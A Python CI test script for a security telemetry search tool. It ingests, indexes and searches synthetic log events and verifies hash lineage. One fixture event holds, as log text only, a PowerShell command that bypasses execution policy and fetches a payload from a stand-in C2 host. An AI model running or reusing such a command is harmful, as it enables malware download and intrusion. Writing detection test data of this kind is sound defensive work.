#!/usr/bin/env python3
"""CI End-to-End Blob Ingest and Evidence Search Verification.

Proves:
1. Ingests a real telemetry blob containing target token X ("FLAG{APT29_COZY_BEAR_C2_REV_98471}").
2. Seals WAL to Lance datasets and builds native Lance scalar / inverted indices.
3. Executes a Dynamic DuckDB Unified View search proving Value X is found and displayed.
4. Executes Hybrid BM25 full-text scoring with exact boolean filter expressions.
5. Ingests unsealed live WAL tail event Y and verifies instant query visibility.
6. Verifies tamper-evident cryptographic hash lineage.
"""

from __future__ import annotations

import json
import subprocess
import sys
import tempfile
from pathlib import Path

TARGET_X = "FLAG{APT29_COZY_BEAR_C2_REV_98471}"
TARGET_Y = "FLAG{TAIL_WAL_LIVE_EVENT_9999}"


def run(cmd: list[str]) -> str:
    print(f"+ {' '.join(cmd)}")
    proc = subprocess.run(cmd, capture_output=True, text=True)
    if proc.returncode != 0:
        print(f"Error output:\n{proc.stderr}", file=sys.stderr)
        raise RuntimeError(f"Command failed ({proc.returncode}): {' '.join(cmd)}")
    return proc.stdout


def main() -> int:
    tmp = Path(tempfile.mkdtemp(prefix="snort_ci_blob_"))
    blob_file = tmp / "telemetry_blob.jsonl"
    wal_dir = tmp / "wal"
    sealed_dir = tmp / "sealed"
    index_dir = tmp / "index"

    print(f"[*] Setting up CI blob test in {tmp}...")

    # Step 1: Create realistic security telemetry blob with Value X
    events = [
        {
            "ts": "2024-01-01T12:00:00Z",
            "host": "web-gateway-01",
            "action": "network-connect",
            "subject": "proxy-srv",
            "object": "10.10.10.50:443",
            "raw": "connect from 192.168.1.100 to 10.10.10.50:443 established ssl=TLSv1.3",
        },
        {
            "ts": "2024-01-01T12:00:05Z",
            "host": "workstation-corp-042",
            "action": "process-create",
            "subject": "proc-4096",
            "object": "powershell.exe",
            "raw": f'powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri https://c2.telemetry-sync.net/payload?token={TARGET_X}"',
        },
        {
            "ts": "2024-01-01T12:00:10Z",
            "host": "workstation-corp-042",
            "action": "file-create",
            "subject": "proc-4096",
            "object": "C:\\Windows\\Temp\\stage2.dll",
            "raw": "file dropped C:\\Windows\\Temp\\stage2.dll size=24576 bytes sha256=3a1b2c...",
        },
        {
            "ts": "2024-01-01T12:00:15Z",
            "host": "auth-dc-01",
            "action": "auth-success",
            "subject": "CORP\\Administrator",
            "object": "kerberos-tgt",
            "raw": "Kerberos TGT requested for CORP\\Administrator from 192.168.1.42 ticket_flags=0x40810010",
        },
    ]

    with open(blob_file, "w", encoding="utf-8") as fh:
        for ev in events:
            fh.write(json.dumps(ev) + "\n")

    print(f"[*] Wrote telemetry blob ({len(events)} events) to {blob_file}")

    # Step 2: Ingest blob into WAL
    python = sys.executable
    out = run([python, "-m", "snort.cli", "ingest", "--format", "jsonl", "--wal-dir", str(wal_dir), str(blob_file)])
    print(out.strip())

    # Step 3: Seal WAL into Lance datasets
    out = run([python, "-m", "snort.cli", "seal", "--wal-dir", str(wal_dir), "--sealed-dir", str(sealed_dir)])
    print(out.strip())

    # Step 4: Build Lance scalar and inverted BM25 indices
    out = run([python, "-m", "snort.cli", "index", "--sealed-dir", str(sealed_dir), "--index-dir", str(index_dir)])
    print(out.strip())

    # Step 5: Search for Value X via DuckDB Unified View
    print(f"\n[*] Searching for Value X ({TARGET_X}) across Lance datasets...")
    out = run([
        python, "-m", "snort.cli", "search", TARGET_X,
        "--sealed-dir", str(sealed_dir),
        "--index-dir", str(index_dir),
        "--wal-dir", str(wal_dir),
        "--json",
    ])
    matches = json.loads(out)
    if not matches:
        raise AssertionError(f"Target Value X ({TARGET_X}) not found in search results!")

    match_x = matches[0]
    if TARGET_X not in match_x["raw"]:
        raise AssertionError(f"Target Value X not in matched raw record: {match_x}")

    print("\n" + "=" * 60)
    print(f"SUCCESS: Found Value X in blob!")
    print(f"  Value X  : {TARGET_X}")
    print(f"  Segment  : {match_x.get('_segment')}")
    print(f"  Row      : {match_x.get('_row')}")
    print(f"  Source   : {match_x.get('_source')}")
    print(f"  Raw Text : {match_x.get('raw')[:140]}...")
    print("=" * 60 + "\n")

    # Step 6: Test Hybrid BM25 search with boolean filter
    print(f"[*] Executing Hybrid BM25 search for Value X with boolean filter (host = 'workstation-corp-042')...")
    bm25_out = run([
        python, "-m", "snort.cli", "search", TARGET_X,
        "--sealed-dir", str(sealed_dir),
        "--index-dir", str(index_dir),
        "--wal-dir", str(wal_dir),
        "--bm25",
        "--filter", "host = 'workstation-corp-042'",
        "--json",
    ])
    bm25_matches = json.loads(bm25_out)
    if not bm25_matches:
        raise AssertionError("BM25 hybrid search returned no matches!")
    bm25_hit = bm25_matches[0]
    score = bm25_hit.get("_score")
    print(f"  BM25 Score : {score}")
    print(f"  Host Filter: {bm25_hit.get('host')}")
    assert score is not None and score > 0, f"Expected positive BM25 score, got {score}"
    assert bm25_hit["host"] == "workstation-corp-042"

    # Step 7: Append unsealed live event Y to WAL tail without sealing
    print(f"\n[*] Appending live unsealed WAL tail event Y ({TARGET_Y})...")
    tail_event = {
        "ts": "2024-01-01T12:05:00Z",
        "host": "endpoint-live-099",
        "action": "alert",
        "subject": "edr-agent",
        "object": "c2-beacon",
        "raw": f"EDR detection alert: suspicious token detected: {TARGET_Y}",
    }
    tail_file = tmp / "tail_blob.jsonl"
    with open(tail_file, "w", encoding="utf-8") as fh:
        fh.write(json.dumps(tail_event) + "\n")
    # Ingest into WAL without sealing
    run([python, "-m", "snort.cli", "ingest", "--format", "jsonl", "--wal-dir", str(wal_dir), str(tail_file)])

    # Search for Target Y (must come from unsealed WAL tail)
    tail_out = run([
        python, "-m", "snort.cli", "search", TARGET_Y,
        "--sealed-dir", str(sealed_dir),
        "--index-dir", str(index_dir),
        "--wal-dir", str(wal_dir),
        "--json",
    ])
    tail_matches = json.loads(tail_out)
    assert len(tail_matches) == 1, f"Expected 1 tail match, got {len(tail_matches)}"
    assert tail_matches[0]["_source"] == "wal", f"Expected _source='wal', got {tail_matches[0]['_source']}"
    print(f"  Live WAL tail match verified: {tail_matches[0]['_source']} in {tail_matches[0]['_segment']}")

    # Step 8: Verify store cryptographic integrity
    print(f"\n[*] Verifying cryptographic store lineage...")
    v_out = run([python, "-m", "snort.cli", "verify", "--wal-dir", str(wal_dir), "--sealed-dir", str(sealed_dir)])
    v_report = json.loads(v_out)
    assert v_report["ok"] is True, f"Store verification failed: {v_report}"
    print(f"  Store verification: OK (wal_ok={v_report.get('wal', {}).get('ok')}, sealed_ok={v_report.get('sealed', {}).get('ok')})")

    print("\n[ALL CI BLOB INGEST & SEARCH CHECKS PASSED]")
    return 0


if __name__ == "__main__":
    sys.exit(main())
